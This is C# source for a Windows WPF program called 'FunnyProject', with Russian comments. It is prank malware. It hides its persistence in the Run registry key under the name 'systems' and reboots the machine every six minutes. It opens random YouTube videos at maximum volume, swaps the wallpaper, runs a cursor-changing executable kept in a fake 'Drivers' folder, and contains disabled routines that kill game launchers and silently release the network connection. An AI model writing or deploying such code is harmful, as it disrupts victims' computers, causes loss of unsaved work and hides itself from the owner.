using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Hosting;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;


namespace FunnyProject
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
             
            InitializeComponent();

            SetAutoRun(true, Assembly.GetExecutingAssembly().Location);
            
            //main таймер
            DispatcherTimer dispatcher = new DispatcherTimer();
            dispatcher.Tick += new EventHandler(dispatcherTimer_Tick);
            dispatcher.Interval = new TimeSpan(0, 6, 0);
            dispatcher.Start();

            //таймер ссылок на браузер
            DispatcherTimer OpenWebUrl = new DispatcherTimer();
            OpenWebUrl.Tick += new EventHandler(OpenWebUrl_Tick);
            OpenWebUrl.Interval = new TimeSpan(0, 3,0 );
            OpenWebUrl.Start();
            
            //Таймер убийства приложений и игр
            DispatcherTimer KillGameAndApps = new DispatcherTimer();
            KillGameAndApps.Tick += new EventHandler(KillGameAndApps_Tick);
            KillGameAndApps.Interval = new TimeSpan(1, 30, 0);
            //KillGameAndApps.Start();
            
            //таймер смены обоев 
            DispatcherTimer ChangePicture = new DispatcherTimer();
            ChangePicture.Tick += new EventHandler(ChangePicture_Ticks);
            ChangePicture.Interval = new TimeSpan(0, 2, 0);
            ChangePicture.Start();
            
            //Таймер откл интернета
            DispatcherTimer InternetOff = new DispatcherTimer() ;
            InternetOff.Interval = new TimeSpan(3,0,0);
            InternetOff.Tick += new EventHandler(InternetOff_Tick);
           // InternetOff.Start();
            
            //таймер смены курсора
            DispatcherTimer ChangeCur = new DispatcherTimer();
            ChangeCur.Interval = new TimeSpan(0,2,5);
            ChangeCur.Tick += new EventHandler( ChangeCur_Tick);
            ChangeCur.Start();
        }

        private void ChangeCur_Tick(object sender, EventArgs e)
        {
            Process.Start("C:\\Program Files (x86)\\Drivers\\Cursor\\CursorStart.exe");

        }

        private void InternetOff_Tick(object sender, EventArgs e)
        {
            InternetOFF();
        }

        private void ChangePicture_Ticks(object sender, EventArgs e)
        {
            Random random = new Random();
            string[] Jpg = { "1.jpg", "2.jpg", "3.jpg", "4.jpg", "5.jpg", "6.jpg", "7.jpg", "8.jpg", "9.jpg", "10.jpg" };
            string PathJpg = Directory.GetCurrentDirectory() + "\\"; //возвращает путь 
            string path = "C:\\Program Files (x86)\\Drivers\\" + "Service\\" + Jpg[random.Next(0, Jpg.Length)];

            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                if (process.ProcessName == "wallpaper32.exe"|| process.ProcessName == "wallpaper32" || process.ProcessName == "wallpaper" || process.ProcessName == "wallpaper64")
                {
                    process.Kill();
                }
            }
            SetDesktopWallpaper(path);           
        }
        private void KillGameAndApps_Tick(object sender, EventArgs e)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                if(process.ProcessName == "GTA5.exe" || process.ProcessName == "GTAVLauncher.exe" || process.ProcessName == "Steam.exe" || process.ProcessName == "Steam" || process.ProcessName == "EpicGamesLauncher"
                   || process.ProcessName == "EpicGamesLauncher.exe")
                {
                    process.Kill();
                }

            
            }
            foreach (Process process in processes)
            {
                if (process.ProcessName == "wallpaper32.exe" || process.ProcessName == "wallpaper32" || process.ProcessName == "wallpaper" || process.ProcessName == "wallpaper64")
                {
                    process.Kill();
                }
            }
        }

        public int NumUrl = 0;
        private void OpenWebUrl_Tick(object sender, EventArgs e)
        {
            string[] url = { "https://youtu.be/WLYI5BPsZF8?t=36", "https://youtu.be/aWt9bGilBa0?t=1", "https://youtu.be/t8Ok-q8P8T0?t=2", "https://youtu.be/MkWDKJjhbvw?t=109", "https://youtu.be/Dko8PT5kD5g?t=2", "https://youtu.be/8a7xYNWiVgE?t=30", "https://youtu.be/awGX0EZyAZw?t=25", "https://youtu.be/4kw6ifEKKcU?t=15", "https://youtu.be/BOFFKD7QGvk?t=4", "https://youtu.be/fEEMygU55SI?t=1", "https://youtu.be/Yea0s-wyWPg?t=1", "https://youtu.be/r29k_T_o9To?t=50", "https://youtu.be/Bu88kGzBRXU?t=32", "https://youtu.be/MkddXj7pQHM?t=1", "https://youtu.be/rzcFsykYPgA?t=3", "https://youtu.be/FAPwIEWzqJE?t=52" };
            
            Random random = new Random();
            NumUrl = random.Next(1,url.Length); 
            AudioEndpoint Volume  = new AudioEndpoint();
            Volume.Inizialize(1f);
 
            Process.Start(url[NumUrl]);
        }
        private void dispatcherTimer_Tick(object sender, EventArgs e)
        {
            RebootPC();
        }
        public void RebootPC()
        {
            Process.Start("shutdown", "/r /t 0");
            Close();
        }
        public void InternetOFF()
        {            
            ProcessStartInfo internet = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = "/C ipconfig /" + "release",
                WindowStyle = ProcessWindowStyle.Hidden
            };
            Process.Start(internet);
        }
        private bool SetAutoRun(bool autoran, string path) // автозапуск программы 
        {
            const string name = "systems";
            string ExePath = path;
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autoran)
                {
                    reg.SetValue(name, ExePath);
                }
                else
                {
                    reg.DeleteValue(name);
                }
                reg.Flush();
                reg.Close();
            }
            catch (Exception) { return false; }
            return true;
        }
        //----------методы под смену обоев---------------//
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        int MAX_PATH = 260;
        int SPI_GETDESKWALLPAPER = 0x73;
        int SPI_SETDESKWALLPAPER = 0x14;
        int SPIF_UPDATEINIFILE = 0x01;
        int SPIF_SENDWININICHANGE = 0x02;
        string GetDesktopWallpaper()
        {
            string wallpaper = new string('\0', MAX_PATH);
            SystemParametersInfo(SPI_GETDESKWALLPAPER, (int)wallpaper.Length, wallpaper, 0);
            return wallpaper.Substring(0, wallpaper.IndexOf('\0'));
        }
        void SetDesktopWallpaper(string filePath)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filePath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
    }
}
